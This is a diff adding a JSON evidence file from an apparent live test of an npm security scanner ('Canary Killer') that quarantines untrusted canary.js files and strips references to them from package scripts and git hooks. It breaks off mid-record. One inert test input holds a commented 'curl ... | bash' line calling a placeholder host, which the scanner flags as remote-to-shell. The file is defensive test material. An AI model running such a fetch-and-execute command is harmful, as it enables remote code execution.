@@ -1,0 +1,1239 @@
+{
+  "testedRevision": "cda0b794e4eb1684fba427ca606b3c51add74a86",
+  "date": "2026-10-12",
+  "platform": "win32",
+  "node": "v24.16.0",
+  "npm": "11.13.0",
+  "method": "Committed live test; actual CLI/npm processes and actual filesystem watch events, without launch/scanner mocks. npm prefix ran offline with scripts disabled. Monitor JSON records are parsed process output; npm stdout/stderr and filesystem snapshots are retained. Temporary test projects were removed after assertions.",
+  "assertions": "All committed live-test assertions passed",
+  "sourceSha256": {
+    "src/core/canaryTrust.js": "e9a44959036e4a56c420adfd79bd50c9e751d86cd0d3031dfa39881773134299",
+    "src/core/canaryMonitor.js": "f6aed0e316be1aea7c62d176839b050175243ef977d23c9d5929b3512bb7e09d",
+    "src/core/canaryProtection.js": "04bcd0835699700f3642ec6e70a79ed065525163f0ca36a6a3536976496ce011",
+    "src/core/canaryRepair.js": "d962bddd43d5b160ef60e52ad360019c6aeb2a616113c55dbed78a68b241e3b6",
+    "src/core/canaryQuarantine.js": "101c758ddac0d749994abb8c7104450d401f9b402702f824c01459fbe47a0cc1",
+    "src/commands/canary-killer.js": "6f1e8c20069f6e936202685b2aa54dd09d893d7946c0225c97adb07bb0064fe7",
+    "src/commands/canary-monitor.js": "9494dfd02880585f3fe3a7346c3dcfdbebaf09781c4bde9e248657b4910fc3ca",
+    "src/cli.js": "4ee1e8fbc2a9af0a119905b85b51ad23389de0cb7fd25b5369453d66d5238323",
+    "src/utils/config.js": "5be1c4176a2f46917d7e433982da857159cda53b498501bd427079c53385ec51",
+    "src/utils/npm.js": "fe313ffc0639561319da1d90380b2f4f31ed7cd7928baf72cca8d27def03ad94",
+    "test/e2e/canary-trust-monitor-live.test.js": "f54ebdc40822dc44dad25cf03a2db2412c4fa43faa227781e7a9c34e0d88499a"
+  },
+  "observations": [
+    {
+      "kind": "trusted-native-launch",
+      "root": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\native-trust",
+      "exit": 0,
+      "stdout": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\native-trust\n",
+      "stderr": "",
+      "before": {
+        "trustedFilePresent": true,
+        "trustedFileSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+        "scripts": {
+          "build": "node legit/canary.js && tsc",
+          "prepare": "node legit/canary.js"
+        },
+        "hook": "#!/bin/sh\nnode legit/canary.js\necho preserved\n",
+        "ignore": null
+      },
+      "after": {
+        "trustedFilePresent": true,
+        "trustedFileSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+        "scripts": {
+          "build": "node legit/canary.js && tsc",
+          "prepare": "node legit/canary.js"
+        },
+        "hook": "#!/bin/sh\nnode legit/canary.js\necho preserved\n",
+        "ignore": null
+      }
+    },
+    {
+      "kind": "changed-native-launch",
+      "root": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\native-trust",
+      "exit": 0,
+      "stdout": "ℹ Canary protection: 1 files quarantined; 3 references repaired\nC:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\native-trust\n",
+      "stderr": "",
+      "after": {
+        "trustedFilePresent": false,
+        "trustedFileSha256": null,
+        "scripts": {
+          "build": "tsc"
+        },
+        "hook": "#!/bin/sh\necho preserved\n",
+        "ignore": "# np-audit Canary Killer quarantine\ncanary.js\n.np-audit-quarantine/\n"
+      }
+    },
+    {
+      "kind": "real-arrival",
+      "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\incoming\\canary.js",
+      "elapsedMs": 250,
+      "intervalMs": 5000,
+      "status": "quarantined",
+      "after": {
+        "trustedFilePresent": true,
+        "trustedFileSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+        "scripts": {
+          "build": "tsc",
+          "prepare": "node legit/canary.js"
+        },
+        "hook": "#!/bin/sh\nnode legit/canary.js\necho preserved\n",
+        "ignore": "# np-audit Canary Killer quarantine\ncanary.js\n.np-audit-quarantine/\n!/legit/canary.js\n"
+      }
+    },
+    {
+      "kind": "changed-monitored-trust",
+      "after": {
+        "trustedFilePresent": false,
+        "trustedFileSha256": null,
+        "scripts": {
+          "build": "tsc"
+        },
+        "hook": "#!/bin/sh\necho preserved\n",
+        "ignore": "# np-audit Canary Killer quarantine\ncanary.js\n.np-audit-quarantine/\n!/legit/canary.js\n# np-audit Canary Killer quarantine\ncanary.js\n.np-audit-quarantine/\n"
+      }
+    },
+    {
+      "kind": "monitor-session",
+      "root": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor",
+      "args": [
+        "canary-monitor",
+        "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor",
+        "--json",
+        "--interval",
+        "5000"
+      ],
+      "records": [
+        {
+          "event": "scan",
+          "report": {
+            "scan": "canary-killer",
+            "roots": [
+              "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor"
+            ],
+            "complete": false,
+            "findings": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\hooks\\pre-commit",
+                "line": 2,
+                "evidence": "node legit/canary.js",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                "line": 1,
+                "evidence": "// intentional canary test; never execute",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "File is named canary.js; inspect behavior independently of its name."
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+              }
+            ],
+            "references": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\hooks\\pre-commit",
+                "line": 2,
+                "evidence": "node legit/canary.js",
+                "evidenceTruncated": false,
+                "reference": "legit/canary.js",
+                "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                "status": "exists"
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "reference": "legit/canary.js",
+                "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                "status": "exists"
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "reference": "legit/canary.js",
+                "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                "status": "exists"
+              }
+            ],
+            "unreadable": [],
+            "exclusions": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git",
+                "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+              }
+            ],
+            "unresolved": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json",
+                "reason": "Command entry point is not statically resolved",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "command": "tsc"
+              }
+            ],
+            "coverage": {
+              "files": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\config",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\hooks\\pre-commit",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json"
+              ],
+              "canaryFiles": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js"
+                }
+              ],
+              "repositories": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor"
+                }
+              ],
+              "entries": 9,
+              "bytes": 244,
+              "gitConfigs": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\config"
+                }
+              ],
+              "hookDirectories": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\hooks",
+                  "configuredBy": "default"
+                }
+              ],
+              "filenameOnlyFiles": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.npmauditor.json"
+              ]
+            },
+            "limits": {
+              "files": 10000,
+              "entries": 20000,
+              "fileBytes": 1048576,
+              "totalBytes": 33554432,
+              "records": 2000,
+              "depth": 100
+            },
+            "limitations": [
+              "Static text heuristics can match comments, strings and legitimate tools; matches are not malware verdicts.",
+              "No scripts, hooks, Git commands, downloads or repository-configured external commands are executed.",
+              "Only supplied local roots are inspected, including untracked files present there. A GitHub checkout cannot inspect other machines or their local .git/hooks.",
+              "System/global Git configuration and environment overrides are not inferred. Conditional includes and dynamic commands remain unresolved.",
+              "This scan cannot establish host integrity, recover deleted contents, attribute an incident or reconstruct a previously executed payload.",
+              "Protection checks all discovered filenames; content inspection is limited to manifests, Git config/hooks and canary.js. Filename-only paths are listed separately."
+            ],
+            "summary": {
+              "status": "incomplete",
+              "files": 4,
+              "findings": 4,
+              "unresolved": 1,
+              "unreadable": 0,
+              "exclusions": 1
+            },
+            "trust": {
+              "files": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                  "expectedSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+                  "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.npmauditor.json",
+                  "actualSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+                  "status": "trusted"
+                }
+              ],
+              "before": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                  "expectedSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+                  "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.npmauditor.json",
+                  "actualSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+                  "status": "trusted"
+                }
+              ],
+              "basis": "Explicit path and SHA-256 exceptions; neither filenames nor trust entries establish a malware or safety verdict."
+            },
+            "repairs": {
+              "actionsComplete": true,
+              "actions": [],
+              "failures": [],
+              "ignoreRoots": []
+            },
+            "quarantine": {
+              "actionsComplete": true,
+              "actions": [],
+              "excludedStorage": [],
+              "ignoreUpdates": [],
+              "ignoreFailures": [],
+              "before": {
+                "summary": {
+                  "status": "incomplete",
+                  "files": 4,
+                  "findings": 4,
+                  "unresolved": 1,
+                  "unreadable": 0,
+                  "exclusions": 1
+                },
+                "unreadable": [],
+                "exclusions": [
+                  {
+                    "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git",
+                    "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+                  }
+                ],
+                "unresolved": [
+                  {
+                    "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json",
+                    "reason": "Command entry point is not statically resolved",
+                    "line": 1,
+                    "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node legit/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                    "evidenceTruncated": false,
+                    "command": "tsc"
+                  }
+                ]
+              },
+              "evidence": []
+            },
+            "protection": {
+              "allowed": true,
+              "failures": []
+            },
+            "monitor": {
+              "mode": "protect",
+              "intervalMs": 5000,
+              "watchedRoots": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor"
+              ],
+              "watchErrors": [],
+              "limitation": "Arrival monitoring does not intercept execution; a file may run before a notification or periodic check is handled."
+            }
+          }
+        },
+        {
+          "event": "scan",
+          "report": {
+            "scan": "canary-killer",
+            "roots": [
+              "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor"
+            ],
+            "complete": false,
+            "findings": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\hooks\\pre-commit",
+                "line": 2,
+                "evidence": "node legit/canary.js",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                "line": 1,
+                "evidence": "// intentional canary test; never execute",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "File is named canary.js; inspect behavior independently of its name."
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "name": "canary-indicator",
+                "severity": "indicator",
+                "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+              }
+            ],
+            "references": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\hooks\\pre-commit",
+                "line": 2,
+                "evidence": "node legit/canary.js",
+                "evidenceTruncated": false,
+                "reference": "legit/canary.js",
+                "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                "status": "exists"
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "reference": "legit/canary.js",
+                "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                "status": "exists"
+              }
+            ],
+            "unreadable": [],
+            "exclusions": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git",
+                "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.np-audit-quarantine",
+                "reason": "Quarantine storage is not analyzed"
+              }
+            ],
+            "unresolved": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json",
+                "reason": "Command entry point is not statically resolved",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                "evidenceTruncated": false,
+                "command": "tsc"
+              }
+            ],
+            "coverage": {
+              "files": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\config",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\hooks\\pre-commit",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json"
+              ],
+              "canaryFiles": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js"
+                }
+              ],
+              "repositories": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor"
+                }
+              ],
+              "entries": 11,
+              "bytes": 220,
+              "gitConfigs": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\config"
+                }
+              ],
+              "hookDirectories": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\hooks",
+                  "configuredBy": "default"
+                }
+              ],
+              "filenameOnlyFiles": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.gitignore",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.npmauditor.json"
+              ]
+            },
+            "limits": {
+              "files": 10000,
+              "entries": 20000,
+              "fileBytes": 1048576,
+              "totalBytes": 33554432,
+              "records": 2000,
+              "depth": 100
+            },
+            "limitations": [
+              "Static text heuristics can match comments, strings and legitimate tools; matches are not malware verdicts.",
+              "No scripts, hooks, Git commands, downloads or repository-configured external commands are executed.",
+              "Only supplied local roots are inspected, including untracked files present there. A GitHub checkout cannot inspect other machines or their local .git/hooks.",
+              "System/global Git configuration and environment overrides are not inferred. Conditional includes and dynamic commands remain unresolved.",
+              "This scan cannot establish host integrity, recover deleted contents, attribute an incident or reconstruct a previously executed payload.",
+              "Protection checks all discovered filenames; content inspection is limited to manifests, Git config/hooks and canary.js. Filename-only paths are listed separately."
+            ],
+            "summary": {
+              "status": "incomplete",
+              "files": 4,
+              "findings": 3,
+              "unresolved": 1,
+              "unreadable": 0,
+              "exclusions": 2
+            },
+            "trust": {
+              "files": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                  "expectedSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+                  "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.npmauditor.json",
+                  "actualSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+                  "status": "trusted"
+                }
+              ],
+              "before": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\legit\\canary.js",
+                  "expectedSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+                  "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.npmauditor.json",
+                  "actualSha256": "9f1ce2ef3ab2f3fc5abc6c0725ce3868beefaaf8ca5b57ccd925abdf54c40bd4",
+                  "status": "trusted"
+                }
+              ],
+              "basis": "Explicit path and SHA-256 exceptions; neither filenames nor trust entries establish a malware or safety verdict."
+            },
+            "repairs": {
+              "actionsComplete": true,
+              "actions": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\hooks\\pre-commit",
+                  "line": 4,
+                  "evidence": "node incoming/canary.js",
+                  "evidenceTruncated": false,
+                  "before": "node incoming/canary.js",
+                  "after": null,
+                  "targets": [
+                    "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\incoming\\canary.js"
+                  ]
+                },
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json",
+                  "line": 1,
+                  "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node incoming/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                  "evidenceTruncated": false,
+                  "script": "build",
+                  "before": "node incoming/canary.js && tsc",
+                  "after": "tsc",
+                  "targets": [
+                    "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\incoming\\canary.js"
+                  ]
+                }
+              ],
+              "failures": [],
+              "ignoreRoots": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor"
+              ]
+            },
+            "quarantine": {
+              "actionsComplete": true,
+              "actions": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\incoming\\canary.js",
+                  "status": "quarantined",
+                  "ignore": {
+                    "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.gitignore",
+                    "status": "updated"
+                  },
+                  "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.np-audit-quarantine\\entry-thrxCk\\payload.quarantined",
+                  "metadata": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.np-audit-quarantine\\entry-thrxCk\\metadata.json"
+                }
+              ],
+              "excludedStorage": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.np-audit-quarantine"
+              ],
+              "ignoreUpdates": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.gitignore",
+                  "status": "updated"
+                }
+              ],
+              "ignoreFailures": [],
+              "before": {
+                "summary": {
+                  "status": "incomplete",
+                  "files": 5,
+                  "findings": 7,
+                  "unresolved": 1,
+                  "unreadable": 0,
+                  "exclusions": 1
+                },
+                "unreadable": [],
+                "exclusions": [
+                  {
+                    "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git",
+                    "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+                  }
+                ],
+                "unresolved": [
+                  {
+                    "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json",
+                    "reason": "Command entry point is not statically resolved",
+                    "line": 1,
+                    "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"node incoming/canary.js && tsc\",\"prepare\":\"node legit/canary.js\"}}",
+                    "evidenceTruncated": false,
+                    "command": "tsc"
+                  }
+                ]
+              },
+              "evidence": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\incoming\\canary.js",
+                  "line": 1,
+                  "evidence": "// changed inert input; never execute",
+                  "evidenceTruncated": false,
+                  "name": "canary-indicator",
+                  "severity": "indicator",
+                  "detail": "File is named canary.js; inspect behavior independently of its name."
+                },
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\incoming\\canary.js",
+                  "line": 2,
+                  "evidence": "// curl http://trust-monitor.invalid/payload | bash",
+                  "evidenceTruncated": false,
+                  "name": "remote-to-shell",
+                  "severity": "review",
+                  "detail": "Download command, possibly continued across lines, is piped to a shell; fetched content is not retrieved or verified."
+                }
+              ]
+            },
+            "protection": {
+              "allowed": true,
+              "failures": []
+            },
+            "monitor": {
+              "mode": "protect",
+              "intervalMs": 5000,
+              "watchedRoots": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor"
+              ],
+              "watchErrors": [],
+              "limitation": "Arrival monitoring does not intercept execution; a file may run before a notification or periodic check is handled."
+            }
+          }
+        },
+        {
+          "event": "scan",
+          "report": {
+            "scan": "canary-killer",
+            "roots": [
+              "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor"
+            ],
+            "complete": false,
+            "findings": [],
+            "references": [],
+            "unreadable": [],
+            "exclusions": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git",
+                "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+              },
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.np-audit-quarantine",
+                "reason": "Quarantine storage is not analyzed"
+              }
+            ],
+            "unresolved": [
+              {
+                "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json",
+                "reason": "Command entry point is not statically resolved",
+                "line": 1,
+                "evidence": "{\"name\":\"npa-trust-monitor-live\",\"version\":\"1.0.0\",\"private\":true,\"scripts\":{\"build\":\"tsc\"}}",
+                "evidenceTruncated": false,
+                "command": "tsc"
+              }
+            ],
+            "coverage": {
+              "files": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\config",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\hooks\\pre-commit",
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\package.json"
+              ],
+              "canaryFiles": [],
+              "repositories": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor"
+                }
+              ],
+              "entries": 10,
+              "bytes": 124,
+              "gitConfigs": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\config"
+                }
+              ],
+              "hookDirectories": [
+                {
+                  "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.git\\hooks",
+                  "configuredBy": "default"
+                }
+              ],
+              "filenameOnlyFiles": [
+                "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-trust-monitor-live-8N0yv3\\automatic-monitor\\.gitignore",
